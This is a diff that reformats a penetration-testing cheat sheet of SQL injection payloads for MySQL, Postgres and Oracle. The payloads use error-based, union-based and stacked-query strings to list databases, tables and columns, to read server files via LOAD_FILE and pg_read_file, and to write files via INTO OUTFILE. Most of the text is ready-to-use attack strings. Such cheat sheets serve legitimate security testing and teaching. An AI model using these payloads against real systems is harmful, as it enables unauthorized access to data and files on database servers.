@@ -154,131 +154,212 @@ Just like before, you will need to enable the privs first, sometimes they may be
 ```
 ## MYSQL
 
-### List databases:
+#### List databases
 
-- Normal
-    - `SHOW DATABASES;`
-- Error based 32 character limit
-    - `' EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET 1)))--`
-- Union Based
-    - `' UNION SELECT schema_name, NULL FROM information_schema.schemata --`
-- Stacked Queries:
-    - `; SHOW DATABASES; --`
+Normal
+```sql
+SHOW DATABASES;
+```
 
-### List Tables:
+Error based (32 character limit)
+```sql
+' EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET 1)))--
+```
+Union Based
+```sql
+' UNION SELECT schema_name, NULL FROM information_schema.schemata --
+```
+Stacked Queries:
+```sql
+; SHOW DATABASES; --
+```
 
-- Normal
-    - `SHOW TABLES;`
-- Error based
-    - `' EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT table_name FROM information_schema.tables WHERE table_schema = 'database_name' LIMIT 1 OFFSET 1)))--`
-- Union Based
-    - `' UNION SELECT TABLE_NAME, NULL FROM information_schema.tables WHERE table_schema = 'database_name' --`
-- Stacked Queries:
-    - `; SHOW TABLES; --`
+#### List Tables
+Normal
+```sql
+SHOW TABLES;
+```
+Error based
+```sql
+' EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT table_name FROM information_schema.tables WHERE table_schema = 'database_name' LIMIT 1 OFFSET 1)))--
+```
 
-### List columns:
+Union Based
+```sql
+' UNION SELECT TABLE_NAME, NULL FROM information_schema.tables WHERE table_schema = 'database_name' --
+```
+Stacked Queries:
+```sql
+; SHOW TABLES; --
+```
+#### List columns
+Normal
+```sql
+SHOW COLUMNS FROM table_name;
+```
+Error based
+```sql
+' EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT column_name FROM information_schema.columns WHERE table_name = 'table_name' LIMIT 1 OFFSET 1)))--
+```
 
-- Normal
-    - `SHOW COLUMNS FROM table_name;`
-- Error based
-    - `' EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT column_name FROM information_schema.columns WHERE table_name = 'table_name' LIMIT 1 OFFSET 1)))--`
-- Union Based
-    - `' UNION SELECT COLUMN_NAME, NULL FROM information_schema.columns WHERE table_name = 'table_name' --`
-- Stacked Queries:
-    - `; SHOW COLUMNS FROM table_name; --`
+Union Based
+```sql
+' UNION SELECT COLUMN_NAME, NULL FROM information_schema.columns WHERE table_name = 'table_name' --
+```
+Stacked Queries:
+```sql
+; SHOW COLUMNS FROM table_name; --
+```
 
-### Read Files:
+#### Read Files:
+Normal
+```sql
+SELECT LOAD_FILE('/path/to/file');
+```
+SQLi
+```sql
+' UNION SELECT LOAD_FILE('/path/to/file'), NULL --
+```
 
-- Normal
-    - `SELECT LOAD_FILE('/path/to/file');`
-- SQLi
-    - `' UNION SELECT LOAD_FILE('/path/to/file'), NULL --`
-
-### Write Files:
-
-- Normal
-    - `SELECT * INTO OUTFILE '/path/to/file' FROM table_name;`
-- SQLi
-    - `' UNION SELECT column_name FROM table_name INTO OUTFILE '/path/to/file' --`
+#### Write Files:
+Normal
+```sql
+SELECT * INTO OUTFILE '/path/to/file' FROM table_name;
+```
+SQLi
+```sql
+' UNION SELECT column_name FROM table_name INTO OUTFILE '/path/to/file' --
+```
 
 ## Postgres
 
-### List databases:
+#### List databases
+Normal
+```sql
+SELECT datname FROM pg_database;
+```
+Error based
+```sql
+' (SELECT CAST((SELECT datname FROM pg_database LIMIT 1 OFFSET 1) AS integer))--
+```
+Union Based
+```sql
+' UNION SELECT datname, NULL FROM pg_database --
+```
+Stacked Queries
+```sql
+; SELECT datname FROM pg_database; --
+```
 
-- Normal
-    - `SELECT datname FROM pg_database;`
-- Error based
-    - `' (SELECT CAST((SELECT datname FROM pg_database LIMIT 1 OFFSET 1) AS integer))--`
-- Union Based
-    - `' UNION SELECT datname, NULL FROM pg_database --`
-- Stacked Queries:
-    - `; SELECT datname FROM pg_database; --`
 
-### List Tables:
+#### List Tables:
+Normal
+```sql
+SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';
+```
+Error based
+```sql
+' (SELECT CAST((SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' LIMIT 1 OFFSET 1) AS integer))--
+```
+Union Based
+```sql
+' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = 'public' --
+```
+Stacked Queries:
+```sql
+; SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'; --
+```
 
-- Normal
-    - `SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';`
-- Error based
-    - `' (SELECT CAST((SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' LIMIT 1 OFFSET 1) AS integer))--`
-- Union Based
-    - `' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = 'public' --`
-- Stacked Queries:
-    - `; SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'; --`
+#### List columns:
+Normal
+```sql
+SELECT column_name FROM information_schema.columns WHERE table_name = 'table_name';
+```
+Error based
+```sql
+' (SELECT CAST((SELECT column_name FROM information_schema.columns WHERE table_name = 'table_name' LIMIT 1 OFFSET 1) AS integer))--
+```
+Union Based
+```sql
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'table_name' --
+```
+Stacked Queries:
+```sql
+; SELECT column_name FROM information_schema.columns WHERE table_name = 'table_name'; --
+```
 
-### List columns:
+#### Read Files:
 
-- Normal
-    - `SELECT column_name FROM information_schema.columns WHERE table_name = 'table_name';`
-- Error based
-    - `' (SELECT CAST((SELECT column_name FROM information_schema.columns WHERE table_name = 'table_name' LIMIT 1 OFFSET 1) AS integer))--`
-- Union Based
-    - `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'table_name' --`
-- Stacked Queries:
-    - `; SELECT column_name FROM information_schema.columns WHERE table_name = 'table_name'; --`
+Normal
+```sql
+SELECT pg_read_file('/path/to/file', 0, 1000000);
+```
+SQLi
+```sql
+' UNION SELECT pg_read_file('/path/to/file', 0, 1000000), NULL --
+```
 
-### Read Files:
-
-- Normal
-    - `SELECT pg_read_file('/path/to/file', 0, 1000000);`
-- SQLi
-    - `' UNION SELECT pg_read_file('/path/to/file', 0, 1000000), NULL --`
-
-### Write Files:
-
-- Normal
-    - `COPY table_name TO '/path/to/file' DELIMITER ',' CSV HEADER;`
+#### Write Files:
+Normal
+```sql
+COPY table_name TO '/path/to/file' DELIMITER ',' CSV HEADER;
+```
 
 ## ORACLE
 
-### List databases:
+#### List databases:
 
-- Normal
-    - `SELECT name FROM v$database;`
-- Error based
-    - `' AND (SELECT COUNT(*) FROM v$database) --`
-- Union Based
-    - `' UNION SELECT name, NULL FROM v$database --`
-- Stacked Queries:
-    - `; SELECT name FROM v$database; --`
+Normal
+```sql
+SELECT name FROM v$database;
+```
 
-### List Tables:
+Error based
+```sql
+' AND (SELECT COUNT(*) FROM v$database) --
+```
+Union Based
+```sql
+' UNION SELECT name, NULL FROM v$database --
+```
+Stacked Queries:
+```sql
+; SELECT name FROM v$database; --
+```
+#### List Tables:
 
-- Normal
-    - `SELECT table_name FROM all_tables;`
-- Error based
-    - `' AND (SELECT COUNT(*) FROM all_tables) --`
-- Union Based
-    - `' UNION SELECT table_name, NULL FROM all_tables --`
-- Stacked Queries:
-    - `; SELECT table_name FROM all_tables; --`
+Normal
+```sql
+SELECT table_name FROM all_tables;
+```
+Error based
+```sql
+' AND (SELECT COUNT(*) FROM all_tables) --
+```
+Union Based
+```sql
+' UNION SELECT table_name, NULL FROM all_tables --
+```
+Stacked Queries:
+```sql
+; SELECT table_name FROM all_tables; --
+```
 
-### List columns:
+#### List columns:
 
-- Normal
-    - `SELECT column_name FROM all_tab_columns WHERE table_name = 'table_name';`
-- Error based
-    - `' AND (SELECT COUNT(*) FROM all_tab_columns WHERE table_name = 'table_name') --`
-- Union Based
-    - `' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'table_name' --`
-- Stacked Queries:
-    - `; SELECT column_name FROM all_tab_columns WHERE table_name = 'table_name'; --`
+Normal
+```sql
+SELECT column_name FROM all_tab_columns WHERE table_name = 'table_name';
+```
+Error based
+```sql
+' AND (SELECT COUNT(*) FROM all_tab_columns WHERE table_name = 'table_name') --
+```
+Union Based
+```sql
+' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'table_name' --
+```
+Stacked Queries:
+```sql
+; SELECT column_name FROM all_tab_columns WHERE table_name = 'table_name'; --
+```
